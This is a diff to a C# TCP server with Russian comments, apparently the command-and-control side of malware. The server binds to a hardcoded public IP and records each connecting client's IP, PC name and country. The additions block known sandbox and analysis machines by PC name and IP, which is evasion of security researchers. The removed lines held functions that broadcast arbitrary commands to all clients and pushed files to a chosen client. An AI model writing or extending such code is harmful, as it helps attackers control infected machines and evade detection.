@@ -11,6 +11,22 @@ class Server
     private static SortedList<int, TcpClient> clients = new SortedList<int, TcpClient>();
     private static TcpListener listener;
 
+    private static readonly string[] BlacklistedPCNames =
+    {
+        "DESKTOP-ICCRDPD", "TVM-PC", "DESKTOP-JGLLJLD", "DESKTOP-0IJITTJ", "JOEBILL"
+    };
+
+    private static readonly string[] BlacklistedIPs =
+    {
+        "84.17.40.108", "31.28.104.137", "185.100.87.41", "185.220.101.39",
+        "84.247.105.120", "111.7.100.42", "157.245.77.56", "111.7.100.41",
+        "111.7.100.36", "111.7.100.37", "111.7.100.38", "111.7.100.39",
+        "111.7.100.40", "111.7.100.43", "111.7.100.44", "176.100.243.133",
+        "20.99.160.173", "35.186.54.177", "34.85.254.161", "34.17.55.59"
+    };
+
+    private static readonly Dictionary<int, ClientInfo> clientInfo = new Dictionary<int, ClientInfo>();
+
     public static void Main()
     {
         listener = new TcpListener(IPAddress.Parse("193.58.121.250"), 7175);
@@ -25,7 +41,92 @@ class Server
         while (true)
         {
             TcpClient client = listener.AcceptTcpClient();
+            IPEndPoint clientEndPoint = (IPEndPoint)client.Client.RemoteEndPoint;
+
+            // Проверка на чёрный список
+            if (IsBlacklisted(client, clientEndPoint, clientId))
+            {
+                Console.WriteLine($"[Server] Отклонено подключение с IP {clientEndPoint.Address} или имени ПК.");
+                client.Close();
+                continue;
+            }
+
             new Thread(() => HandleClient(client, clientId++)).Start();
+        }
+    }
+
+    private static bool IsBlacklisted(TcpClient client, IPEndPoint clientEndPoint, int clientId)
+    {
+        string clientIP = clientEndPoint.Address.ToString();
+
+        // Проверка IP-адреса
+        foreach (string blacklistedIP in BlacklistedIPs)
+        {
+            if (clientIP == blacklistedIP)
+            {
+                Console.WriteLine($"[Server] Клиент с IP {clientIP} находится в чёрном списке.");
+                return true;
+            }
+        }
+
+        // Получение имени ПК от клиента
+        try
+        {
+            NetworkStream stream = client.GetStream();
+            byte[] buffer = new byte[1024];
+            int bytesRead = stream.Read(buffer, 0, buffer.Length);
+
+            if (bytesRead > 0)
+            {
+                string clientInfoStr = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                string[] parts = clientInfoStr.Split('_');
+
+                if (parts.Length > 1)
+                {
+                    string clientName = parts[1];
+                    foreach (string blacklistedName in BlacklistedPCNames)
+                    {
+                        if (string.Equals(clientName, blacklistedName, StringComparison.OrdinalIgnoreCase))
+                        {
+                            Console.WriteLine($"[Server] Клиент с именем ПК {clientName} находится в чёрном списке.");
+                            return true;
+                        }
+                    }
+
+                    // Сохранение информации о клиенте
+                    string country = GetCountryByIP(clientIP); // Получение страны через IP
+                    clientInfo[clientId] = new ClientInfo
+                    {
+                        Ip = clientIP,
+                        PcName = clientName,
+                        Country = country
+                    };
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[Server] Ошибка при проверке клиента: {ex.Message}");
+        }
+
+        return false;
+    }
+
+    private static string GetCountryByIP(string ip)
+    {
+        try
+        {
+            using (var client = new WebClient())
+            {
+                // Пример использования API "ipinfo.io" или другого сервиса
+                string url = $"http://ip-api.com/line/{ip}?fields=country";
+                string country = client.DownloadString(url).Trim();
+                return string.IsNullOrEmpty(country) ? "Unknown Country" : country;
+            }
+        }
+        catch
+        {
+            return "Unknown Country";
         }
     }
 
@@ -35,12 +136,12 @@ class Server
         byte[] buffer = new byte[1024];
 
         int bytesRead = stream.Read(buffer, 0, buffer.Length);
-        string clientInfo = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+        string clientInfoStr = Encoding.UTF8.GetString(buffer, 0, bytesRead);
 
         lock (clients)
         {
             clients[clientId] = client;
-            Console.WriteLine($"[Server] Клиент {clientId} подключен ({clientInfo})");
+            Console.WriteLine($"[Server] Клиент {clientId} подключен ({clientInfoStr})");
         }
 
         while (client.Connected)
@@ -50,7 +151,6 @@ class Server
                 bytesRead = stream.Read(buffer, 0, buffer.Length);
                 if (bytesRead > 0)
                 {
-                    // Обновление информации о клиенте
                     lock (clients)
                     {
                         clients[clientId] = client;
@@ -67,7 +167,7 @@ class Server
         lock (clients)
         {
             clients.Remove(clientId);
-            Console.WriteLine($"[Server] Клиент {clientId} отключен ({clientInfo})");
+            Console.WriteLine($"[Server] Клиент {clientId} отключен ({clientInfoStr})");
         }
     }
 
@@ -102,22 +202,7 @@ class Server
         while (true)
         {
             string input = Console.ReadLine();
-            if (input.StartsWith("go "))
-            {
-                string command = input.Substring(3);
-                SendCommandToAllClients(command);
-            }
-            else if (input.StartsWith("file "))
-            {
-                string[] parts = input.Split(' ');
-                if (parts.Length == 3)
-                {
-                    int clientId = int.Parse(parts[1]);
-                    string filePath = parts[2];
-                    SendFileToClient(clientId, filePath);
-                }
-            }
-            else if (input == "list")
+            if (input == "list")
             {
                 ShowClientList();
             }
@@ -131,71 +216,23 @@ class Server
             Console.WriteLine("[LIST]");
             foreach (var client in clients)
             {
-                Console.WriteLine($"{client.Key} - {GetClientInfo(client.Value)}");
-            }
-        }
-    }
-
-    private static string GetClientInfo(TcpClient client)
-    {
-        try
-        {
-            return ((IPEndPoint)client.Client.RemoteEndPoint).ToString();
-        }
-        catch
-        {
-            return "Unknown";
-        }
-    }
-
-    private static void SendCommandToAllClients(string command)
-    {
-        lock (clients)
-        {
-            foreach (var client in clients)
-            {
-                try
+                if (clientInfo.ContainsKey(client.Key))
                 {
-                    NetworkStream stream = client.Value.GetStream();
-                    byte[] data = Encoding.UTF8.GetBytes(command);
-                    stream.Write(data, 0, data.Length);
-                    Console.WriteLine($"[Server] Команда отправлена клиенту {client.Key}: {command}");
+                    ClientInfo info = clientInfo[client.Key];
+                    Console.WriteLine($"{info.Ip} - {info.PcName} ({info.Country})");
                 }
-                catch (Exception ex)
+                else
                 {
-                    Console.WriteLine($"[Server] Ошибка отправки команды клиенту {client.Key}: {ex.Message}");
+                    Console.WriteLine("Unknown client data");
                 }
             }
         }
     }
 
-    private static void SendFileToClient(int clientId, string filePath)
+    class ClientInfo
     {
-        lock (clients)
-        {
-            if (clients.ContainsKey(clientId))
-            {
-                TcpClient client = clients[clientId];
-                NetworkStream stream = client.GetStream();
-
-                try
-                {
-                    byte[] fileBytes = File.ReadAllBytes(filePath);
-                    byte[] fileNameBytes = Encoding.UTF8.GetBytes(Path.GetFileName(filePath));
-
-                    // Сначала отправляем название файла
-                    stream.Write(fileNameBytes, 0, fileNameBytes.Length);
-                    stream.WriteByte(0); // Завершаем строку
-
-                    // Затем отправляем файл
-                    stream.Write(fileBytes, 0, fileBytes.Length);
-                    Console.WriteLine($"[Server] Отправлен файл клиенту {clientId}: {filePath}");
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"[Server] Ошибка отправки файла клиенту {clientId}: {ex.Message}");
-                }
-            }
-        }
+        public string Ip { get; set; }
+        public string PcName { get; set; }
+        public string Country { get; set; }
     }
 }
